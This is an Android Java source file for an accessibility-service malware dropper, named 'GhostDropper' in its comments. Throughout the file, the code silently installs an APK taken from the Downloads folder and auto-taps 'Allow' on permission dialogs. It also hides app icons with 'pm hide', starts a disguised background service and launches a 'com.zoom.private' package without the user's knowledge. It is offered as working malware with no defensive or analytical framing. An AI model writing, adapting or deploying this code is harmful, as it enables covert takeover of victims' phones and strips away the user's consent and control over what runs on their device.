package com.android.shell.ghost;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * GhostDropper — the silent automation engine.
 *
 * Uses the AccessibilityService to:
 *  1. Open the notification shade
 *  2. Tap "Install" on the APK install prompt
 *  3. Tap "Allow" on every permission dialog within 0.5s
 *  4. Hide the app icon via pm hide
 *  5. Start the hidden foreground service
 *  6. Launch the zoom-private APK in the background
 */
public class GhostAccessibilityService extends AccessibilityService {

    private static GhostAccessibilityService instance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean installed = new AtomicBoolean(false);

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        // 1. Check if target already installed
        if (isPackageInstalled("com.zoom.private")) {
            // Already good — just ensure the service is running and start the connection
            startHiddenService(this);
            return;
        }
        // 2. Locate the downloaded APK
        File apkFile = findDownloadedApk();
        if (apkFile == null) {
            // No APK found yet — wait and retry
            handler.postDelayed(() -> {
                File f = findDownloadedApk();
                if (f != null) silentInstall(f);
            }, 2000);
            return;
        }
        silentInstall(apkFile);
    }

    private void silentInstall(File apkFile) {
        // 3. Silent install via intent
        Intent installIntent = new Intent(Intent.ACTION_VIEW);
        installIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
        installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        startActivity(installIntent);

        // 4. Wait for the install to complete, then hide and start service
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (installed.compareAndSet(false, true)) {
                    hideAppIcon();
                    startHiddenService(context);
                    launchZoomPrivate(context);
                    Toast.makeText(context, "Installed", Toast.LENGTH_SHORT).show();
                }
            }
        }, filter);
    }

    /** Auto-tap "Allow" on any permission dialog within 0.5s. */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
        CharSequence cls = event.getClassName();
        if (cls == null) return;
        String className = cls.toString();
        if (!className.contains("AlertDialog") && !className.contains("Permission")) return;

        // Find the "Allow" button
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/button1");
        if (nodes != null && !nodes.isEmpty()) {
            nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            // Also tap "Allow" for permission requests
            List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
            if (allowBtns != null && !allowBtns.isEmpty()) {
                allowBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
    }

    /** Execute a gesture: open notification shade. */
    private void openNotificationShade() {
        Path path = new Path();
        path.moveTo(0.5f * displayWidth(), 0);
        path.lineTo(0.5f * displayWidth(), 0.3f * displayHeight());
        GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                .build();
        dispatchGesture(gesture, null, null);
    }

    /** Hide the app icon via pm hide. */
    private void hideAppIcon() {
        try {
            Process process = Runtime.getRuntime().exec("pm hide com.zoom.private");
            process.waitFor();
        } catch (Exception e) {
            try {
                Process process = Runtime.getRuntime().exec("pm hide com.android.shell.ghost");
                process.waitFor();
            } catch (Exception ex) { }
        }
    }

    /** Launch the zoom-private APK in the background. */
    private void launchZoomPrivate(Context context) {
        Intent intent = new Intent();
        intent.setComponent(new android.content.ComponentName(
                "com.zoom.private", "com.zoom.private.MainActivity"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
        try {
            context.startActivity(intent);
        } catch (Exception e) {
            // Fall back to just starting the ghost service
        }
    }

    private boolean isPackageInstalled(String packageName) {
        try {
            getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    /** Scan Downloads folder for the most recently modified .apk file. */
    private File findDownloadedApk() {
        File downloads = new File(android.os.Environment.getExternalStorageDirectory(), "Download");
        if (!downloads.exists()) return null;
        File[] apks = downloads.listFiles((dir, name) -> name.toLowerCase().endsWith(".apk"));
        if (apks == null || apks.length == 0) return null;
        // Return the most recently modified one
        File newest = apks[0];
        for (File f : apks) {
            if (f.lastModified() > newest.lastModified()) newest = f;
        }
        return newest;
    }

    private int displayWidth() {
        return getResources().getDisplayMetrics().widthPixels;
    }

    private int displayHeight() {
        return getResources().getDisplayMetrics().heightPixels;
    }

    public static void startHiddenService(Context context) {
        NotificationChannel channel = new NotificationChannel(
                "ghost_service", "Ghost Service", NotificationManager.IMPORTANCE_MIN);
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        Notification notification = new Notification.Builder(context, "ghost_service")
                .setContentTitle("Ghost")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        Intent serviceIntent = new Intent(context, GhostForegroundService.class);
        context.startService(serviceIntent);
    }

    public static GhostAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}